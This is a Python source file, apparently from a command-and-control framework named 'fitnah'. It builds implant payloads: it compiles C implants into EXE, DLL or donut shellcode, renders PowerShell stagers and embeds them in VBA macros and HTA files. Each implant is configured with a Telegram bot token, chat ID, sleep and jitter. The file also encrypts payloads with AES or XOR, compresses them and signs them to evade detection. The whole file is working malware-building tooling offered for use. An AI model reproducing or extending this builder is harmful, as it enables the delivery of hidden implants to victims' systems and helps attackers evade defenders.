"""
Builder engine — orchestrates the full payload build pipeline.

Pipeline per format:

  EXE  : compile C implant → PE → (optional AES/XOR encrypt loader) → .exe
  DLL  : compile C implant with -shared → .dll
  SHEL : compile → PE → donut → raw shellcode → (encrypt) → (lzma compress)
  PS1  : render PS1 stager template → .ps1
  VBA  : render PS1 stager → embed in VBA macro → .bas
  HTA  : render PS1 stager → embed in HTA → .hta
"""
from __future__ import annotations

import hashlib
import lzma
import shutil
import subprocess
import time
from pathlib import Path

from fitnah.builder.models import (
    Arch, BuildRequest, BuildResult, Encrypt, OutputFormat,
)


class BuildEngine:
    def __init__(self, output_dir: str | Path = "build"):
        self._out = Path(output_dir)
        self._out.mkdir(parents=True, exist_ok=True)

    # ── public entry point ────────────────────────────────────────────────

    def build(self, req: BuildRequest) -> BuildResult:
        """Dispatch to the appropriate builder based on req.format."""
        self._out.mkdir(parents=True, exist_ok=True)
        dispatch = {
            OutputFormat.PS1:       self._build_ps1,
            OutputFormat.VBA:       self._build_vba,
            OutputFormat.HTA:       self._build_hta,
            OutputFormat.EXE:       self._build_pe,
            OutputFormat.DLL:       self._build_pe,
            OutputFormat.SHELLCODE: self._build_shellcode,
        }
        fn = dispatch.get(req.format)
        if fn is None:
            return BuildResult(ok=False, error=f"Unknown format: {req.format}")

        result = fn(req)

        # post-processing: compress, sign
        if result.ok and result.path and result.path.exists():
            # optional LZMA compression
            if getattr(req, "compress", False):
                result = self._apply_compression(result)

            # optional code signing
            if result.ok and getattr(req, "sign", False):
                result = self._apply_signing(result, req)

        if result.ok and result.path and result.path.exists():
            data             = result.path.read_bytes()
            result.size_bytes = len(data)
            result.sha256     = hashlib.sha256(data).hexdigest()
            # record in artifacts list
            if result.path not in result.artifacts:
                result.artifacts.append(result.path)
            # also include .h sidecar if present
            h_path = result.path.with_suffix(".h")
            if h_path.exists() and h_path not in result.artifacts:
                result.artifacts.append(h_path)

        return result

    # ── PS1 ───────────────────────────────────────────────────────────────

    def _build_ps1(self, req: BuildRequest) -> BuildResult:
        from fitnah.builder.stagers import ps1 as ps1_mod
        content  = ps1_mod.render(req.bot_token, req.chat_id, req.agent_id,
                                  req.sleep, req.jitter)
        out_path = self._out / req.output_name
        out_path.write_text(content, encoding="utf-8")
        return BuildResult(ok=True, path=out_path)

    # ── VBA ───────────────────────────────────────────────────────────────

    def _build_vba(self, req: BuildRequest) -> BuildResult:
        from fitnah.builder.stagers import ps1 as ps1_mod, vba as vba_mod
        ps1_src  = ps1_mod.render(req.bot_token, req.chat_id, req.agent_id,
                                  req.sleep, req.jitter)
        content  = vba_mod.render(req.bot_token, req.chat_id, req.agent_id,
                                  req.sleep, req.jitter, ps1_src)
        out_path = self._out / req.output_name
        out_path.write_text(content, encoding="utf-8")
        return BuildResult(ok=True, path=out_path)

    # ── HTA ───────────────────────────────────────────────────────────────

    def _build_hta(self, req: BuildRequest) -> BuildResult:
        from fitnah.builder.stagers import ps1 as ps1_mod, hta as hta_mod
        ps1_src  = ps1_mod.render(req.bot_token, req.chat_id, req.agent_id,
                                  req.sleep, req.jitter)
        content  = hta_mod.render(req.bot_token, req.chat_id, req.agent_id,
                                  req.sleep, req.jitter, ps1_src)
        out_path = self._out / req.output_name
        out_path.write_text(content, encoding="utf-8")
        return BuildResult(ok=True, path=out_path)

    # ── EXE / DLL ─────────────────────────────────────────────────────────

    def _build_pe(self, req: BuildRequest) -> BuildResult:
        from fitnah.builder.compiler import compile_implant
        from fitnah.builder.encryptor import (
            encrypt_aes_gcm, encrypt_xor,
            wrap_aes_gcm_c_array, wrap_xor_c_array,
        )

        out_path = self._out / req.output_name
        defines  = self._agent_defines(req)

        if req.encrypt == Encrypt.AES256GCM:
            key, nonce, _ = encrypt_aes_gcm(b"placeholder")
            defines["FITNAH_AES_KEY"]   = key.hex()
            defines["FITNAH_AES_NONCE"] = nonce.hex()

        extra = []
        if req.format == OutputFormat.DLL:
            extra = ["-shared"]

        result = compile_implant(out_path, req.arch, defines, extra_flags=extra)
        return result

    # ── SHELLCODE ─────────────────────────────────────────────────────────

    def _build_shellcode(self, req: BuildRequest) -> BuildResult:
        from fitnah.builder.compiler import compile_implant
        from fitnah.builder.donut_wrap import pe_to_shellcode
        from fitnah.builder.encryptor import (
            encrypt_aes_gcm, encrypt_xor,
            wrap_aes_gcm_c_array, wrap_xor_c_array,
        )

        log: list[str] = []

        # 1. compile to intermediate PE
        pe_path = self._out / f"_tmp_{req.agent_id}.exe"
        defines = self._agent_defines(req)
        pe_res  = compile_implant(pe_path, req.arch, defines)
        log    += pe_res.build_log
        if not pe_res.ok:
            return BuildResult(ok=False, error=pe_res.error, build_log=log)

        # 2. donut → raw shellcode (respects shellcode_method field)
        shellcode_method = getattr(req, "shellcode_method", "donut")
        sc_path = self._out / f"_tmp_{req.agent_id}.bin"

        if shellcode_method == "none":
            # Return raw PE directly as "shellcode" artifact
            out_exe = self._out / req.output_name
            shutil.move(str(pe_path), str(out_exe))
            return BuildResult(ok=True, path=out_exe, build_log=log,
                               warnings=["shellcode_method=none: returning raw PE"])

        sc_res = pe_to_shellcode(pe_path, sc_path, req.arch)
        log   += sc_res.build_log
        if not sc_res.ok:
            out_exe = self._out / req.output_name.replace(".shellcode", ".exe")
            pe_path.rename(out_exe)
            return BuildResult(
                ok=True, path=out_exe, build_log=log,
                warnings=[f"donut unavailable, returning PE: {sc_res.error}"],
            )

        raw_sc = sc_path.read_bytes()

        # 3. optionally encrypt the shellcode
        out_path = self._out / req.output_name
        if req.encrypt == Encrypt.AES256GCM:
            key, nonce, ct = encrypt_aes_gcm(raw_sc)
            header         = wrap_aes_gcm_c_array(key, nonce, ct)
            out_path.with_suffix(".h").write_text(header, encoding="utf-8")
            out_path.write_bytes(ct)
            log.append("AES-256-GCM encrypted shellcode written.")
        elif req.encrypt == Encrypt.XOR:
            key, ct = encrypt_xor(raw_sc)
            header  = wrap_xor_c_array(key, ct)
            out_path.with_suffix(".h").write_text(header, encoding="utf-8")
            out_path.write_bytes(ct)
            log.append("XOR-encoded shellcode written.")
        else:
            out_path.write_bytes(raw_sc)

        pe_path.unlink(missing_ok=True)
        sc_path.unlink(missing_ok=True)
        return BuildResult(ok=True, path=out_path, build_log=log)

    # ── post-processing ───────────────────────────────────────────────────

    def _apply_compression(self, result: BuildResult) -> BuildResult:
        """LZMA-compress the output artifact in-place, appending .lzma extension."""
        try:
            src_data     = result.path.read_bytes()
            compressed   = lzma.compress(src_data, preset=6)
            lzma_path    = result.path.with_suffix(result.path.suffix + ".lzma")
            lzma_path.write_bytes(compressed)
            result.build_log.append(
                f"LZMA compressed: {len(src_data):,} → {len(compressed):,} bytes"
            )
            result.path      = lzma_path
            result.artifacts.append(lzma_path)
        except Exception as exc:
            result.warnings.append(f"LZMA compression failed: {exc}")
        return result

    def _apply_signing(self, result: BuildResult, req: BuildRequest) -> BuildResult:
        """Run signtool.exe if available and a PFX cert path is configured."""
        pfx_path = getattr(req, "cert_path", "") or ""
        if not pfx_path:
            result.warnings.append("sign=True but cert_path not set — skipping signing")
            return result

        signtool = shutil.which("signtool") or shutil.which("signtool.exe")
        if not signtool:
            # try common paths
            for candidate in [
                r"C:\Program Files (x86)\Windows Kits\10\bin\x64\signtool.exe",
                r"C:\Program Files\Windows Kits\10\bin\x64\signtool.exe",
            ]:
                if Path(candidate).exists():
                    signtool = candidate
                    break

        if not signtool:
            result.warnings.append("signtool.exe not found in PATH or Kit dirs — skipping signing")
            return result

        pfx_password = getattr(req, "cert_password", "") or ""
        cmd = [signtool, "sign", "/fd", "sha256", "/f", pfx_path]
        if pfx_password:
            cmd += ["/p", pfx_password]
        cmd += ["/t", "http://timestamp.digicert.com", str(result.path)]

        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if proc.returncode == 0:
                result.build_log.append(f"Signed: {result.path.name}")
            else:
                result.warnings.append(f"signtool error: {proc.stderr.strip()[:200]}")
        except Exception as exc:
            result.warnings.append(f"signtool failed: {exc}")

        return result

    # ── helpers ───────────────────────────────────────────────────────────

    @staticmethod
    def _agent_defines(req: BuildRequest) -> dict[str, str]:
        return {
            "FITNAH_BOT_TOKEN": req.bot_token,
            "FITNAH_CHAT_ID":   req.chat_id,
            "FITNAH_AGENT_ID":  req.agent_id,
            "FITNAH_SLEEP":     str(req.sleep),
            "FITNAH_JITTER":    str(req.jitter),
        }
